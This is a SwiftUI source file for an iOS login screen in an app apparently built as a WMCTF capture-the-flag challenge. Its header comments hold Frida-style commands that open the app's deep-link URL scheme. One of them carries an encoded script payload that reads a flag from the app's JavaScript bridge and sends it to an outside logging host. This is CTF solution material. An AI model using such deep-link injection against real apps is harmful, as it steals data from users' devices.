//
//  LoginView.swift
//  chess
//
//  Created by dwj1210 on 2022/7/19.
//
// ObjC.classes.UIApplication.sharedApplication().openURL_(ObjC.classes.NSURL.URLWithString_("chess://www.apple.com"))
// ObjC.classes.UIApplication.sharedApplication().openURL_(ObjC.classes.NSURL.URLWithString_("chess://www.baidu.com"))
// ObjC.classes.UIApplication.sharedApplication().openURL_(ObjC.classes.NSURL.URLWithString_("chess://x?urlType=web&url=http%3A%2F%2Fwww.apple.com"))
// ObjC.classes.UIApplication.sharedApplication().openURL_(ObjC.classes.NSURL.URLWithString_("chess://x?urlType=web&url=data%3Atext%2Fhtml%3B%2C%253Cscript%2520type%253D%2522application%252Fjavascript%2522%253E%2528function%2520payload%2528%2529%2520%257B%2520%2520%250A%2520%2520var%2520xhr%2520%253D%2520new%2520XMLHttpRequest%2528%2529%253B%2520xhr.open%2528%2527GET%2527%252C%2520%2527http%253A%252F%252Fhttplog.coderpub.com%252Fhttplog%252Ftest%253Fflag%253D%2527%2520%252B%2520wmctf.%2524_getFlag%2528%2529%252C%2520false%2529%253B%2520xhr.send%2528%2529%253B%250A%257D%2529%2528%2529%253C%252Fscript%253E"))

import Foundation
import SwiftUI

struct LoginView: View {
    @State var account: String = ""
    @State var password: String = ""
    @State private var showLoggedIn = false

    
    var body: some View {
        
        VStack {
            Text("Welcome to WMCTF!").padding().font(Font.custom("PressStart2P-Regular", size: 20))
            
            LogoImage()

            VStack {
                HStack {
                    Image("ic_user")
                        .padding(.leading, (UIScreen.main.bounds.width * 20) / 414)

                    TextField("Account", text: $account)

                        .frame(height: (UIScreen.main.bounds.width * 40) / 414, alignment: .center)
                        .padding(.leading, (UIScreen.main.bounds.width * 10) / 414)
                        .padding(.trailing, (UIScreen.main.bounds.width * 10) / 414)
                        .font(.system(size: (UIScreen.main.bounds.width * 15) / 414, weight: .regular, design: .default))
                        .imageScale(.small)
                        .keyboardType(.emailAddress)
                        .autocapitalization(UITextAutocapitalizationType.none)
                }
                seperator()
            }

            VStack {
                HStack {
                    Image("ic_password")
                        .padding(.leading, (UIScreen.main.bounds.width * 20) / 414)

                    TextField("Password", text: $password)
                        .frame(height: (UIScreen.main.bounds.width * 40) / 414, alignment: .center)
                        .padding(.leading, (UIScreen.main.bounds.width * 10) / 414)
                        .padding(.trailing, (UIScreen.main.bounds.width * 10) / 414)
                        .font(.system(size: (UIScreen.main.bounds.width * 15) / 414, weight: .regular, design: .default))
                        .imageScale(.small)
                }
                seperator()
            }

            VStack {
                Spacer()
                Button(action: {
                    print("account -> ", self.$account, "\npassword -> ", self.$password)
//                    self.showLoggedIn = true

                }) {
                    buttonWithBackground(btnText: "LOGIN")
                }.sheet(isPresented: self.$showLoggedIn) {
//                    ContentWebView(url: URL(string: "https://www.apple.com")!)
                }

                Spacer()
            }
        }
    }
}

struct LoginView_Previews: PreviewProvider {
    static var previews: some View {
        LoginView().previewDevice("iPhone 12")
    }
}
